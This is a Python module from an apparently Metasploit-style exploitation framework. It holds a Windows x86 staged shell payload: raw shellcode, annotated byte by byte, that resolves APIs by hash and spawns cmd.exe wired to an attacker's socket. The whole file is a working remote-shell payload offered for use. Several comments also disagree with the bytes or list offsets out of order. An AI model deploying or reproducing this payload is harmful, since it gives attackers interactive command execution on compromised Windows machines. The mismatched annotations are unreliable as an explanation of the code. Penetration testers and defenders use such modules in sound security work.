from collections.abc import Sequence

from teralibs.tsf.base.payload import ARCH_X86, PLATFORM_WINDOWS, STAGE, Payload


class TerasploitModule(Payload):
    """Windows x86 interactive shell stage (piped cmd.exe)."""

    NAME: str = "Windows x86 Shell Stage"
    DESCRIPTION: str = (
        "Spawn a piped command shell (staged) for Windows x86.  "
        "Byte-exact port of the Metasploit windows/shell stage by "
        "spoonm and sf.  Delivered automatically over the channel "
        "opened by a compatible stager (sockedi convention).  "
        "Not used directly by exploit modules."
    )
    AUTHOR: Sequence = ["spoonm", "sf", "4steroth"]
    LICENSE: str = "BSD-3-CLAUSE"
    VERSION: str = "1.0"
    RANK: str = "normal"
    REFERENCES: Sequence = ["https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/stages/windows/shell.rb"]
    PAYLOAD_TYPE: str = STAGE
    MAX_SIZE: int | None = 1024 * 1024  # 1 MiB - stages travel over the socket
    ARCH: Sequence = [ARCH_X86]
    PLATFORM: Sequence = [PLATFORM_WINDOWS]
    STAGE_BLOB: bytes = (
        # [0x000] API resolver: cld + call api_call (+0x89)
        b"\xfc\xe8\x89\x00\x00\x00"
        # [0x006] find_lib: pushad; mov ebp,esp; xor edx,edx
        b"\x60\x89\xe5\x31\xd2"
        # [0x00B] mov edx,fs:[edx+30h] → PEB
        b"\x64\x8b\x52\x30"
        # [0x00F] walk InMemoryOrderModuleList
        b"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
        b"\x0f\xb7\x4a\x26"
        # [0x01D] xor edi,edi; xor eax,eax
        b"\x31\xff\x31\xc0"
        # [0x021] ROR13 DLL name hash loop
        b"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0"
        # [0x02F] push edx; push edi; walk exports
        b"\x52\x57"
        b"\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01"
        b"\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b"
        # [0x060] ROR13 function name hash loop
        b"\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4"
        # [0x070] compare hash; resolve ordinal → eax
        b"\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b"
        b"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24"
        # [0x090-style] popad; pop ecx; pop edx; push ecx; jmp eax
        b"\x5b\x5b\x61\x59\x5a\x51\xff\xe0"
        # [0x088] next_mod: pop edi; pop edx; mov edx,[edx]; jmp find_lib
        b"\x58\x5f\x5a\x8b\x12\xeb\x86"
        # [0x08F] api_call: pop ebp   ← resolver entry point
        b"\x5d"
        #  Stage body (offset 0x90 = 144)
        # push "cmd\0" (5 bytes); save ptr in ebx
        b"\x68\x63\x6d\x64\x00"  # push  "cmd\0"
        b"\x89\xe3"  # mov   ebx, esp     ; ebx → "cmd\0"
        # push 3* NULL (WaitForSingleObject / CreateProcess stack args)
        b"\x57\x57\x57"  # push  edi * 3      ; socket in edi (sockedi conv.)
        # Build STARTUPINFOA on stack:
        #   zero 18 dwords via loop (xor esi,esi; push 0x12 → ecx; loop push esi)
        b"\x31\xf6"  # xor   esi, esi
        b"\x6a\x12"  # push  0x12         ; ecx = 18
        b"\x59"  # pop   ecx
        b"\x56"  # push  esi          ; ← loop body
        b"\xe2\xfd"  # loop  -3           ; push 18 dwords of 0
        # Patch STARTUPINFOA fields:
        #   [esp+3Ch].w = 0x0101  (cb low word = 0x44 not needed; dwFlags = STARTF_USESTDHANDLES|1)
        b"\x66\xc7\x44\x24\x3c\x01\x01"  # mov   word [esp+3Ch], 0x0101
        #   lea eax,[esp+10h]  → &STARTUPINFOA.hStdInput (offset 0x10 from current esp top)
        b"\x8d\x44\x24\x10"  # lea   eax, [esp+10h]
        #   byte [eax] = 0x44  → cb = 68 (sizeof STARTUPINFOA)
        b"\xc6\x00\x44"  # mov   byte [eax], 0x44
        # CreateProcessA(ebx, 0, 0, 0, 1, 0, 0, 0, &si, &pi)
        #   push &pi (top of stack = esp after si allocation)
        b"\x54"  # push  esp          ; lpProcessInformation (&pi)
        b"\x50"  # push  eax          ; lpStartupInfo (&si)
        b"\x56"  # push  esi          ; lpCurrentDirectory = NULL
        b"\x56"  # push  esi          ; lpEnvironment = NULL
        b"\x56"  # push  esi          ; dwCreationFlags = 0
        b"\x46"  # inc   esi          ; bInheritHandles = TRUE (1)
        b"\x56"  # push  esi
        b"\x4e"  # dec   esi          ; restore esi = 0
        b"\x56"  # push  esi          ; lpThreadAttributes = NULL
        b"\x56"  # push  esi          ; lpProcessAttributes = NULL
        b"\x53"  # push  ebx          ; lpCommandLine = NULL (ebx=&cmd)
        b"\x56"  # push  esi          ; lpApplicationName = NULL
        # ROR13 AddHash32 for CreateProcessA = 0x863FCC79
        b"\x68\x79\xcc\x3f\x86"  # push  0x863FCC79
        b"\xff\xd5"  # call  ebp          ; CreateProcessA
        # WaitForSingleObject(pi.hProcess, INFINITE)
        b"\x89\xe0"  # mov   eax, esp     ; eax → pi
        b"\x4e"  # dec   esi          ; esi = -1 = INFINITE
        b"\x56"  # push  esi          ; dwMilliseconds = INFINITE
        b"\x46"  # inc   esi          ; restore esi = 0
        b"\xff\x30"  # push  dword [eax]  ; pi.hProcess
        # ROR13 AddHash32 for WaitForSingleObject = 0x601D8708
        b"\x68\x08\x87\x1d\x60"  # push  0x601D8708
        b"\xff\xd5"  # call  ebp          ; WaitForSingleObject
        # EXITFUNC stub - offset 210 (0xD2), 4-byte LE hash patched by assembler.
        # Default: ExitThread (0x0A2A1DE0).  Assembler overwrites with the
        # appropriate hash for the configured EXITFUNC option.
        b"\xbb\xe0\x1d\x2a\x0a"  # mov   ebx, 0x0A2A1DE0   ; [EXITFUNC @210]
        b"\x68\xa6\x95\xbd\x9d"  # push  0x9DBD95A6        ; hash arg
        b"\xff\xd5"  # call  ebp
        # Retry / fallback chain
        b"\x3c\x06"  # cmp   al, 6
        b"\x7c\x0a"  # jl    +10
        b"\x80\xfb\xe0"  # cmp   bl, 0xE0
        b"\x75\x05"  # jne   +5
        b"\xbb\x47\x13\x72\x6f"  # mov   ebx, 0x6F721347
        b"\x6a\x00"  # push  0
        b"\x53"  # push  ebx
        b"\xff\xd5"  # call  ebp
    )

    def generate_stage(self, ctx):
        """
        Return the Windows x86 shell stage bytes.

        The stager must leave the socket handle in EDI before jumping into
        this stage ('sockedi' PayloadCompat convention).
        """
        return self.STAGE_BLOB
